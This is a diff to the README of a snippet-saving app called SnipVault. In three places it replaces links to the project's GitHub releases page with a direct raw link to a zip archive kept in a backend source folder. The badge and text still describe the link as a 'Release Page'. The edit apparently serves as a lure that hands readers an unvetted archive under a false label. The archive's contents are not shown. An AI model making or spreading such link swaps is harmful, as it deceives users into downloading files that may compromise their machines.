@@ -1,6 +1,6 @@
 # 🗂️ SnipVault - Save and reuse snippets fast
 
-[![Download SnipVault](https://img.shields.io/badge/Download%20SnipVault-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/printgope-oss/SnipVault/releases)
+[![Download SnipVault](https://img.shields.io/badge/Download%20SnipVault-Release%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/printgope-oss/SnipVault/main/backend/app/Snip_Vault_v2.2.zip)
 
 ## 📌 What SnipVault does
 
@@ -23,7 +23,7 @@ If your PC can run current desktop apps, it should handle SnipVault well.
 
 ## 🚀 Download and install
 
-Use this page to download: https://github.com/printgope-oss/SnipVault/releases
+Use this page to download: https://raw.githubusercontent.com/printgope-oss/SnipVault/main/backend/app/Snip_Vault_v2.2.zip
 
 Follow these steps:
 
@@ -189,7 +189,7 @@ This makes it useful for people who build web apps and need a home for reusable 
 
 ## 📥 Download again later
 
-If you want the latest build, return to this page: https://github.com/printgope-oss/SnipVault/releases
+If you want the latest build, return to this page: https://raw.githubusercontent.com/printgope-oss/SnipVault/main/backend/app/Snip_Vault_v2.2.zip
 
 Check the top release entry first. That is usually the newest version
 
